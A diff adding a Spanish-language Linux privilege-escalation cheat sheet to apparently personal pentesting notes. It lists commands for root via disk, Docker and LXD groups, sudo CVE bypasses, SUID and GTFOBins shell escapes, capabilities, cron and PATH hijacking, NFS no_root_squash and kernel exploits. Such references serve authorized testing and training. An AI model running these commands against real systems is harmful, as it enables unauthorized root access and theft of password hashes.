@@ -187,4 +187,125 @@ mysql -u USERNAME -pPASSWORD -h HOSTNAME DATABASENAME
 ```
 
 ## Groups
+Pertenecer a ciertos grupos da vías directas a root.
+
 ### Disk
+Acceso crudo a los dispositivos de bloque → leer/escribir cualquier fichero (incl. `/etc/shadow`).
+```bash
+df -h                                   # localizar el dispositivo de /
+debugfs /dev/sda1                       # navegar el FS sin permisos
+# dentro de debugfs:  cat /etc/shadow
+```
+
+### Docker
+Montar el FS del host o lanzar un contenedor privilegiado = root.
+```bash
+docker run -v /:/mnt --rm -it alpine chroot /mnt sh
+```
+
+### lxd / lxc
+```bash
+# importar imagen y montar / del host
+lxc init alpine r -c security.privileged=true
+lxc config device add r disk source=/ path=/mnt/root recursive=true
+lxc start r && lxc exec r /bin/sh
+```
+
+### Otros grupos peligrosos
+| Grupo | Vía |
+|-------|-----|
+| `sudo` | `sudo -l` → ver qué se puede ejecutar como root |
+| `wheel` | Equivalente a sudo en muchas distros |
+| `adm` | Lectura de logs (`/var/log`) — info sensible |
+| `shadow` | Lectura de `/etc/shadow` → crackear hashes |
+| `video` | Captura de framebuffer (`/dev/fb0`) |
+
+# Sudo
+
+```bash
+sudo -l                         # qué puedo ejecutar como root (¡lo primero!)
+sudo -u#-1 /bin/bash            # CVE-2019-14287 (bypass de Runas)
+```
+
+| Caso | Explotación |
+|------|-------------|
+| `(ALL) NOPASSWD: /bin/X` | Buscar `X` en **GTFOBins** para escapar a shell |
+| `env_keep+=LD_PRELOAD` | Cargar `.so` malicioso al ejecutar con sudo |
+| `sudo` versión vulnerable | Baron Samedit `CVE-2021-3156` (heap overflow) |
+
+# SUID / SGID + GTFOBins
+
+Localizados con `find / -perm -4000 2>/dev/null`. Si el binario aparece en **GTFOBins**, escapar a shell con sus privilegios.
+
+```bash
+# Ejemplos clásicos (binario SUID-root)
+find . -exec /bin/sh -p \; -quit
+nmap --interactive                       # nmap antiguo: !sh
+env /bin/sh -p
+cp /etc/passwd /tmp; # binarios de copia/escritura → sobrescribir /etc/passwd
+```
+
+> El flag `-p` en `/bin/sh -p` evita que se descarten los privilegios (EUID).
+
+# Capabilities
+
+```bash
+getcap -r / 2>/dev/null
+```
+
+| Capability | Explotación |
+|------------|-------------|
+| `cap_setuid+ep` | `./binario -c 'import os; os.setuid(0); os.system("/bin/sh")'` (python) |
+| `cap_dac_read_search` | Leer cualquier fichero (p.ej. `/etc/shadow`) |
+| `cap_dac_override` | Escribir cualquier fichero |
+
+# Cron jobs
+
+```bash
+cat /etc/crontab; ls -la /etc/cron.*; crontab -l
+```
+| Debilidad | Explotación |
+|-----------|-------------|
+| Script cron **escribible** ejecutado por root | Inyectar comando/reverse shell |
+| Wildcard en `tar`/`rsync` (`*`) | **Wildcard injection** (`--checkpoint-action=exec=...`) |
+| PATH relativo en el cron | Plantar binario malicioso en un dir escribible del PATH |
+
+# PATH hijacking
+
+Si un binario SUID llama a otro comando **sin ruta absoluta**:
+```bash
+cd /tmp; echo '/bin/bash -p' > comando; chmod +x comando
+export PATH=/tmp:$PATH
+/ruta/binario_suid           # ejecuta nuestro 'comando'
+```
+
+# NFS (no_root_squash)
+
+Si un export tiene `no_root_squash`, un root remoto crea binarios SUID en el share.
+```bash
+showmount -e VICTIMA
+mount -t nfs VICTIMA:/share /mnt
+# desde root en el atacante:
+cp /bin/bash /mnt/sh; chmod +s /mnt/sh
+# en la víctima:  /share/sh -p
+```
+
+# Kernel exploits
+
+```bash
+uname -r                        # versión del kernel
+searchsploit linux kernel <ver>
+```
+| Exploit | Afecta |
+|---------|--------|
+| DirtyCow `CVE-2016-5195` | Kernels < 4.8.3 (escritura COW) |
+| DirtyPipe `CVE-2022-0847` | Kernels 5.8 – 5.16 |
+| PwnKit `CVE-2021-4034` | `pkexec` (polkit) — casi universal |
+
+> Los exploits de kernel son ruidosos y pueden tumbar la máquina. Última opción tras agotar misconfiguraciones.
+
+# Recursos
+### [GTFOBins](https://gtfobins.github.io/) · [[penelope]]
+### [HackTricks — Linux Privilege Escalation](https://book.hacktricks.xyz/linux-hardening/privilege-escalation)
+### [PEASS-ng (LinPEAS)](https://github.com/peass-ng/PEASS-ng)
+### [g0tmi1k — Basic Linux Privilege Escalation](https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/)
